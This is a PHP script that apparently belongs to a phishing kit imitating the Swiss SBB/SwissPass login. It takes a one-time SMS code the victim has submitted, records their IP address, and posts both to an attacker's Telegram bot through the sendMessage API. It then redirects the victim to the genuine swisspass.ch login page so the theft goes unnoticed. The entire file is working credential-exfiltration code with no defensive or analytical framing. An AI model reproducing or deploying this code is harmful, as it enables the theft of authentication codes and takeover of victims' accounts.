<?php
session_start();
include 'config.php';
require 'stop.php';
require 'a.php';
/*
*/ 

$sms = $_POST['sms'] ;

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 

$message  = "------------------+ 🎁 SBB SMS 🎁+-----------------\r\n";
$message .= "SMS02 : ".$sms."\r\n";
$message .= "---------------+ Host Infos +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ 🛒 SMS01 🛒 +------------------\r\n";



 	$website="https://api.telegram.org/bot" . $api;
    $params=[
        'chat_id' => $chat,
        'text'=>$message,
    ];
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch); 


   $x=md5(microtime());$xx=sha1(microtime());


echo "<script> window.top.location.href = 'https://www.swisspass.ch/oevlogin/login';   </script>";

?>